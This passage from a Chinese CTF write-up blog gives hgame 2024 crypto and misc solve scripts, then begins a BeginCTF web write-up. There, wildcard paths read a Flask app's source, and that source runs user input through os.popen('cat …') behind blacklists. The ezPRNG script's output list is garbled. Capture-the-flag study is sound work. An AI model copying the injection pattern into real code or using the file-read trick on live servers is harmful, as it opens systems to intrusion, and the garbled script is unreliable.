href="https://www.bilibili.com/video/BV1Sh41177Rm/?vd_source=abef91c9524f8373b84bcdb481407372">【CTF-加密】RSA之leak&#x3D;p^q%n+q^p%n</a></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">q=<span class="number">149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span></span><br><span class="line">p=<span class="number">116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span></span><br><span class="line">c=<span class="number">10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;F3rmat_l1tt1e_the0rem_is_th3_bas1s&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ezMath"><a href="#ezMath" class="headerlink" title="ezMath"></a>ezMath</h2><p>佩尔方程求解</p><p>参考这个文章：<a href="https://blog.csdn.net/acdreamers/article/details/8529686">连分数求解Pell方程</a></p><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,y,x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">KEY</span>):</span><br><span class="line">    cipher= AES.new(KEY,AES.MODE_ECB)</span><br><span class="line">    encrypted =cipher.encrypt(flag)</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line">D = <span class="number">114514</span></span><br><span class="line"><span class="keyword">assert</span> x**<span class="number">2</span> - D * y**<span class="number">2</span> == <span class="number">1</span></span><br><span class="line">flag=pad(flag)</span><br><span class="line">key=pad(long_to_bytes(y))[:<span class="number">16</span>]</span><br><span class="line">enc=encrypt(key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc=<span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#enc=b&quot;\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5&#x27;\x93\xf8\xde\xb2\x9a\x9a&quot;</span></span><br></pre></td></tr></table></figure><p>先用java求出 <code>x</code> 和 <code>y</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">solve</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">    &#123;</span><br><span class="line">        BigInteger N, p1, p2, q1, q2, a0, a1, a2, g1, g2, h1, h2,p,q;</span><br><span class="line">        g1 = q2 = p1 = BigInteger.ZERO;</span><br><span class="line">        h1 = q1 = p2 = BigInteger.ONE;</span><br><span class="line">        a0 = a1 = BigInteger.valueOf((<span class="type">int</span>)Math.sqrt(<span class="number">1.0</span>*n));</span><br><span class="line">        BigInteger ans=a0.multiply(a0);</span><br><span class="line">        <span class="keyword">if</span>(ans.equals(BigInteger.valueOf(n)))</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;No solution!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        N = BigInteger.valueOf(n);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            g2 = a1.multiply(h1).subtract(g1);</span><br><span class="line">            h2 = N.subtract(g2.pow(<span class="number">2</span>)).divide(h1);</span><br><span class="line">            a2 = g2.add(a0).divide(h2);</span><br><span class="line">            p = a1.multiply(p2).add(p1);</span><br><span class="line">            q = a1.multiply(q2).add(q1);</span><br><span class="line">            <span class="keyword">if</span> (p.pow(<span class="number">2</span>).subtract(N.multiply(q.pow(<span class="number">2</span>))).compareTo(BigInteger.ONE) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            g1 = g2;h1 = h2;a1 = a2;</span><br><span class="line">            p1 = p2;p2 = p;</span><br><span class="line">            q1 = q2;q2 = q;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;x = &quot;</span>+p+<span class="string">&quot;\ny = &quot;</span>+q);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cin</span> <span class="operator">=</span> <span class="number">114514</span>;</span><br><span class="line">        solve(cin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">x = 3058389164815894335086675882217709431950420307140756009821362546111334285928768064662409120517323199</span></span><br><span class="line"><span class="comment">y = 9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>接着带入python中解aes</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">x = <span class="number">3058389164815894335086675882217709431950420307140756009821362546111334285928768064662409120517323199</span></span><br><span class="line">y = <span class="number">9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680</span></span><br><span class="line"></span><br><span class="line">enc=<span class="string">b&quot;\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5&#x27;\x93\xf8\xde\xb2\x9a\x9a&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">KEY</span>):</span><br><span class="line">    cipher= AES.new(KEY,AES.MODE_ECB)</span><br><span class="line">    decrypted =cipher.decrypt(enc)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">key=pad(long_to_bytes(y))[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">flag=decrypt(key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;G0od!_Yo3_k1ow_C0ntinued_Fra3ti0ns!!!!!!!&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="奇怪的图片"><a href="#奇怪的图片" class="headerlink" title="奇怪的图片"></a>奇怪的图片</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;hgame&#123;fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_image</span>(<span class="params">width, height</span>):</span><br><span class="line">    image = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    pixels = image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            red = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            green = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            blue = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            pixels[x, y] = (red, green, blue)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_text</span>(<span class="params">image, width, height, token</span>):</span><br><span class="line">    font_size = random.randint(<span class="number">16</span>, <span class="number">40</span>)</span><br><span class="line">    font = ImageFont.truetype(<span class="string">&quot;arial.ttf&quot;</span>, font_size)</span><br><span class="line">    text_color = (random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    x = random.randint(<span class="number">0</span>, width - font_size * <span class="built_in">len</span>(token))</span><br><span class="line">    y = random.randint(<span class="number">0</span>, height - font_size)</span><br><span class="line">    draw = ImageDraw.Draw(image)</span><br><span class="line">    draw.text((x, y), token, font=font, fill=text_color)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_unique_strings</span>(<span class="params">n, length</span>):</span><br><span class="line">    unique_strings = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(unique_strings) &lt; n:</span><br><span class="line">        random_string = secrets.token_hex(length // <span class="number">2</span>)</span><br><span class="line">        unique_strings.add(random_string)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(unique_strings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">random_strings = generate_unique_strings(<span class="built_in">len</span>(flag), <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_image = generate_random_image(<span class="number">120</span>, <span class="number">80</span>)</span><br><span class="line">key_image = generate_random_image(<span class="number">120</span>, <span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_time</span>(<span class="params">image, name</span>):</span><br><span class="line">    time.sleep(random.random())</span><br><span class="line">    image.save(<span class="string">&quot;.\\png_out\\&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    current_image = draw_text(current_image, <span class="number">120</span>, <span class="number">80</span>, flag[i])</span><br><span class="line">    threading.Thread(target=random_time, args=(xor_images(current_image, key_image), random_strings[i])).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以知道flag是不断追加在画布<code>current_image</code>上的，每次追加完都会和<code>key_image</code>异或后输出一张图片。</p><p>只要确定 <code>i-1</code> 和 <code>i</code>，它们相互异或，就能得到 <code>flag[i]</code> 字符</p><p>先把所有情况都异或出来，然后单独放一个文件夹。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">base_dir = <span class="string">&#x27;./png_out&#x27;</span></span><br><span class="line"></span><br><span class="line">files = [file <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(base_dir)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(files)):</span><br><span class="line">    os.makedirs(<span class="string">f&#x27;./img/<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;files[i].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(files)):</span><br><span class="line">        img = xor_images(Image.<span class="built_in">open</span>(<span class="string">f&quot;./png_out/<span class="subst">&#123;files[i]&#125;</span>&quot;</span>),Image.<span class="built_in">open</span>(<span class="string">f&quot;./png_out/<span class="subst">&#123;files[j]&#125;</span>&quot;</span>))</span><br><span class="line">        img.save(<span class="string">f&#x27;./img/<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;files[i].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]&#125;</span>/<span class="subst">&#123;files[j]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看所有文件夹，按照大小升序排序，可以在<code>9_5c55dc77</code>文件夹下看到这个情况。</p><p><img src="/./hgame2024_week1/c_3_1.png"></p><p>由此可以确定<code>5c55dc77.png</code>对应着 <code>flag[0]</code> 的<code>h</code>，再对这个文件夹单独处理。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_dir = <span class="string">&#x27;./9_5c55dc77&#x27;</span></span><br><span class="line"></span><br><span class="line">files = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(base_dir):</span><br><span class="line">    imgSize = os.stat(<span class="string">&#x27;./9_5c55dc77/&#x27;</span>+file).st_size</span><br><span class="line">    files[file]=imgSize</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据大小排序</span></span><br><span class="line">sort_files = <span class="built_in">sorted</span>(files.items(),key = <span class="keyword">lambda</span> d:d[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(sort_files)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sort_files)-<span class="number">1</span>):</span><br><span class="line">    img1 = sort_files[i][<span class="number">0</span>]</span><br><span class="line">    img2 = sort_files[i+<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    img = xor_images(Image.<span class="built_in">open</span>(<span class="string">&#x27;./9_5c55dc77/&#x27;</span>+img1),Image.<span class="built_in">open</span>(<span class="string">&#x27;./9_5c55dc77/&#x27;</span>+img2))</span><br><span class="line">    img.save(<span class="string">f&#x27;./new_img/<span class="subst">&#123;<span class="built_in">str</span>(i)&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>可以在<code>new_img</code>文件夹下看到flag。</p><p><img src="/./hgame2024_week1/c_3_2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;1adf_17eb_803c&#125;</span><br></pre></td></tr></table></figure><h2 id="ezPRNG"><a href="#ezPRNG" class="headerlink" title="ezPRNG"></a>ezPRNG</h2><p>用z3求解即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">output=[<span class="string">&#xx27;</span>, <span class="string">&#xx27;</span>, <span class="string">&#xx27;</span>, <span class="string">&#xx27;</span>]</span><br><span class="line"></span><br><span class="line">mask=<span class="number">0b10001001000010000100010010001001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PRNG</span>(<span class="params">R,mask</span>):</span><br><span class="line">    nextR = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    nextbit=<span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        nextbit ^= (i%<span class="number">2</span>)</span><br><span class="line">        i = i&gt;&gt;<span class="number">1</span></span><br><span class="line">    nextR^=nextbit </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (nextR,nextbit)</span><br><span class="line">    </span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    R = BitVec(<span class="string">&#x27;R&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    s = Solver()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        (R,nextbit)=PRNG(R,mask)</span><br><span class="line">        s.add(nextbit==output[k][i])</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">        res = s.model()</span><br><span class="line">        m = <span class="built_in">str</span>(res)[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">        flag+=<span class="built_in">hex</span>(<span class="built_in">int</span>(m))[<span class="number">2</span>:]</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">hgame = <span class="string">&#x27;hgame&#123;&#x27;</span>+flag[:<span class="number">8</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">8</span>:<span class="number">12</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">12</span>:<span class="number">16</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">16</span>:<span class="number">20</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">20</span>:]+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(hgame)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fbbbee823f434f919337907880e4191a</span></span><br><span class="line"><span class="comment"># hgame&#123;fbbbee82-3f43-4f91-9337-907880e4191a&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> MISC </tag>
            
            <tag> CRYPTO </tag>
            
            <tag> REVERSE </tag>
            
            <tag> PWN </tag>
            
            <tag> hgame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeginCTF WP</title>
      <link href="/BeginCTF/"/>
      <url>/BeginCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="readbooks"><a href="#readbooks" class="headerlink" title="readbooks"></a>readbooks</h2><p>这题主打一个大胆猜测（</p><p>先抓包，在<code>/publuc/xx</code>可以查看文件，在<code>/list/</code>路由可以查看目录。</p><p>传入<code>/list/*</code>，可以得到文件的目录</p><p><img src="/./BeginCTF/w_1_1.png"></p><p>接着去<code>/publuc/</code>路由读<code>app.py</code>，传入<code>/publuc/a*</code>，即可得到源码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">DISALLOWED1 = [<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]</span><br><span class="line">DISALLOWED_FILES = [<span class="string">&#x27;app.py&#x27;</span>, <span class="string">&#x27;templates&#x27;</span>, <span class="string">&#x27;etc&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;blacklist&#x27;</span>]</span><br><span class="line">BLACKLIST = [x[:-<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;./blacklist.txt&quot;</span>).readlines()][:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">BLACKLIST.append(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot;\\&quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot; &quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot;tc&quot;</span>)</span><br><span class="line"></span><br><span class="line">ALLOW = [</span><br><span class="line">    <span class="string">&quot;&#123;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pwd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> ALLOW:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        BLACKLIST.remove(a)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/public/&lt;path:name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readbook</span>(<span class="params">name</span>):</span><br><span class="line">    name = <span class="built_in">str</span>(name)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> DISALLOWED1:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> DISALLOWED_FILES:</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = os.popen(<span class="string">&#x27;cat &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name)).read()</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/list/&lt;path:name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">listbook</span>(<span class="params">name</span>):</span><br><span class="line">    name = <span class="built_in">str</span>(name)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> DISALLOWED1:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">            <span 